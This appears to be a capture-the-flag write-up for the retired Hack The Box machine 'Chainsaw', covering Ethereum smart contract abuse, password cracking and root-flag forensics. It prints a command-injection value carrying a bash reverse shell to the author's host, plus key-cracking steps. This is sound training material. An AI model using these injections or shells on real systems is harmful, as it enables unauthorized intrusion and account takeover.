# Chainsaw

This is the write-up for the box Chainsaw that got retired at the 23rd November 2019.
My IP address was 10.10.14.9 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.142    chainsaw.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/chainsaw.nmap 10.10.10.142
```

```markdown
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 1001     1001        23828 Dec 05  2018 WeaponizedPing.json
| -rw-r--r--    1 1001     1001          243 Dec 12  2018 WeaponizedPing.sol
|_-rw-r--r--    1 1001     1001           44 Aug 01 14:35 address.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.9
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.7p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 02:dd:8a:5d:3c:78:d4:41:ff:bb:27:39:c1:a2:4f:eb (RSA)
|   256 3d:71:ff:d7:29:d5:d4:b2:a6:4f:9d:eb:91:1b:70:9f (ECDSA)
|_  256 7e:02:da:db:29:f9:d2:04:63:df:fc:91:fd:a2:5a:f2 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Full TCP port scan:
```markdown
nmap -p- -o nmap/chainsaw-full.nmap 10.10.10.142
```

```markdown
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
9810/tcp open  unknown
```

Scanning port 9810 with scripts:
```markdown
nmap -p 9810 -sC -sV -o nmap/chainsaw-port9810.nmap 10.10.10.142
```

```markdown
PORT     STATE SERVICE VERSION
9810/tcp open unknown                              
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 400 Bad Request
|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: *
|     Content-Type: text/plain
|     Date: Sat, 01 Aug 2020 15:05:15 GMT
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.1 400 Bad Request
|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: *
|     Content-Type: text/plain
|     Date: Sat, 01 Aug 2020 15:05:14 GMT
|     Connection: close
|     Request
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: *
|     Content-Type: text/plain
|     Date: Sat, 01 Aug 2020 15:05:14 GMT
|_    Connection: close
```

## Checking FTP (Port 21)

As the Nmap scan shows, it is possible to login into the FTP service with the _anonymous_ user and download the files:
```markdown
ftp 10.10.10.142

mget *
```

There are three files:
- WeaponizedPing.sol
  - The file starts with `pragma solidity`, so that means that this is a **Solidity** program, which is a programming language for **Smart Contracts** on the **Ethereum Blockchain**
  - It has two functions: _getDomain_ & _setDomain_
- WeaponizedPing.json
  - This is the _Application Binary Interface (ABI)_ to interact with the Smart Contract
    - ABI is like an API for Smart Contracts
- address.txt
  - Content: _0x25C13E38E5aaB1Ab1467f6F3c14Bf64aceFa0133_
    - Based upon the length of the hash string (40 characters), this could be a **SHA-1** hash
  - The file seems to have the current server time, so something touches it regularly

In summary this has to do with the **Ethereum Blockchain** and **Smart Contracts** that has to be exploited.
For a way to connect to the Blockchain, a service has to be found first.

## Checking Port 9810

The service on port 9810 is probably the service to access the Blockchain.
The [documentation of Solidity](https://solidity.readthedocs.io/en/v0.7.0/) is a good starting point to research this technology.

To access it with Python, the [Web3 Python library](https://web3py.readthedocs.io/en/stable/) is needed:
```markdown
pip3 install web3
```

As the Nmap script scan on port 9810 shows, it got access via HTTP, so the _HTTPProvider_ of _Web3_ has to be loaded.
The following code can be run directly in the Python interpreter to connect to the service:
```python
from web3 import Web3, HTTPProvider
import json

# Load configs
contract_address = '0x25C13E38E5aaB1Ab1467f6F3c14Bf64aceFa0133'  # contents of address.txt
contract_data = json.loads(open("WeaponizedPing.json", "r").read())
abi = contract_data['abi']

# Establish connection
w3 = Web3(HTTPProvider('http://10.10.10.142:9810'))
```

Now it is possible to interact with the service:
```python
# Show accounts of all addresses
w3.eth.accounts

# Set first account as default
w3.eth.defaultAccount = w3.eth.accounts[0]

# Set up environment
contract = w3.eth.contract(abi=abi, address=contract_address)

# Get data of function "getDomain"
contract.functions.getDomain().call()

# Set domain to our host
contract.functions.setDomain("10.10.14.9").transact()
```

As the contract is called _WeaponizedPing_ it can be assumed that it sends ICMP packets.
When listening on incoming ICMP packets with `tcpdump` and then executing the _transact()_, this is the case and it `pings` my local host once.
```markdown
tcpdump -i tun0 icmp -n
```

Trying to inject code into this by appending another command:
```python
contract.functions.setDomain("10.10.14.9; ping -c 3 10.10.14.9").transact()
```

This pings three more times and proofs that we got command injection. Lets execute a reverse shell on the box:
```python
contract.functions.setDomain("10.10.14.9; bash -c 'bash -i >& /dev/tcp/10.10.14.9/9001 0>&1'").transact()
```

After sending this command, the listener on my IP and port 9001 starts a reverse shell session as _administrator_.

## Privilege Escalation

There are _/home_ directories for _administrator_ and _bobby_, where the current user permissions are not sufficient to access it.
A Python script _"administrator/maintain/gen.py"_ creates SSH keys and the public keys are in the directory _maintain/pub_.
It has a comment that says:
```markdown
(...)
TODO: Distribute keys via ProtonMail
(...)
```

Which probably means that another way of sending the private keys is used.

The hidden _.ipfs_ directory of _administrator_ reveals that a service called [InterPlanetary File System (IPFS)](https://ipfs.io/) is installed, which is an open-source _"distributed system for storing and accessing files, websites, applications, and data"_.

Listing all documents:
```markdown
ipfs refs local
```

Cycle through all documents:
```markdown
for i in $(ipfs refs local); do ipfs ls $i 2>/dev/null; done
```

Now it shows the real names of the hash files and there are some _.eml_ mail files.
In _/etc/passwd_ there is only the user _bobby_ that can access a shell, so this is the correct target.
```markdown
ipfs cat QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF
```

This shows the contents of the mail file as a _Base64-decoded_ string.
Copying the string to a file and decoding it:
```markdown
base64 -d bobby-key.b64.txt > bobby.key
```

We got the users private key, but it is encrypted:
```markdown
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,53D881F299BA8503
(...)
```

Lets try to crack the password with **JohnTheRipper**:
```markdown
sshng2john bobby-key

john --wordlist=/usr/share/wordlists/rockyou.txt chainsaw-bobby.crack
```

After a while it gets cracked and the password is:
> jackychain

### Privilege Escalation to root

In the home directory of _bobby_ is a folder called _projects/ChainsawClub_ with three files:
- Solidity Smart Contract with many functions: _ChainsawClub.sol_
- JSON file: _ChainsawClub.json_
- ELF binary with **Setuid bit** set: _ChainsawClub_

When executing the binary, it shows some information about credit balance and asks for a username and a password.
There has to be a service to connect to this Smart Contract on the box:
```markdown
ss -lntp
```

It finds a listening port on localhost that looks promising: _127.0.0.1:63991_.
Lets tunnel a local port through this connection via the **SSH command line** to access this port:
```markdown
ssh> -L 1337:127.0.0.1:63991
```

The Python script from before can be used with the according changes to connect to the service:
```python
from web3 import Web3, HTTPProvider
import json

# Load configs
contract_address = '0x3A44d37C6AdfF49e98b1E500726B5C9f9aC5517a'  # contents of address.txt
contract_data = json.loads(open("ChainsawClub.json", "r").read())
abi = contract_data['abi']

# Establish connection
w3 = Web3(HTTPProvider('http://127.0.0.1:1337'))
w3.eth.defaultAccount = w3.eth.accounts[0]

# Setup environment
contract = w3.eth.contract(abi=abi, address=contract_address)
```

It is now possible to set the username for the contract ourselves:
```python
contract.functions.setUsername("test").transact()
```

The password has to be a MD5 hash, so lets generate one with Python and also set it:
```python
import hashlib

pw = hashlib.md5("NewPassword1".encode()).hexdigest()
contract.functions.setPassword(pw).transact()
```

After executing the _ChainsawClub_ binary, the credentials are accepted but it says that the user is not approved, so lets approve it:
```python
contract.functions.setApprove(True).transact()
```

It says that there are not enough funds, so lets transfer some funds:
```python
contract.functions.getSupply().call()
# 1000
contract.functions.getBalance().call()
# 0

contract.functions.transfer(1000).transact()
```

After executing the binary, it now accepts the credentials and starts a shell as root!
Unfortunately when reading the contents of _root.txt_ it says:
> Mine deeper to get rewarded with root coin (RTC)...

## Getting root.txt with Forensic Methods

In Linux _/usr/local_ & _/usr/bin/local_ is usually a place where users put in files by themselves, while _/usr/sbin_ and so on are managed by the package manager of the distribution (in the case of Ubuntu **apt**).
So we will look for things, that `apt` is supposed to manage but was not put there by it.

Looping through all binaries and searching with `dpkg` in which package a program is in:
```bash
for i in $(ls /sbin/*); do dpkg --search $i; done
```

One result comes back with an error from `dpkg`:
```markdown
dpkg-query: no path found matching pattern /sbin/bmap
```

After some research about _bmap_ it seems to be this [bmap on GitHub](https://github.com/CameronLonsdale/bmap), which is used to hide files in **Slack Space**.

When looking at _root.txt_, it is 52 bytes big and the disk usage is 4096 bytes because that is a block on the disk:
```markdown
ls -l root.txt

# Output
-r--r----- 1 root root 52 Jan 23  2019 /root/root.txt
```

```markdown
du -h root.txt

# Output
4.0K    /root/root.txt
```

This is absolutely normal behavior for files on Linux, but it is possible to hide data in this empty block space with _bmap_ that can be shown with it:
```markdown
bmap --slack /root/root.txt
```

This displays the contents of the slack space of _root.txt_ and the box is done!
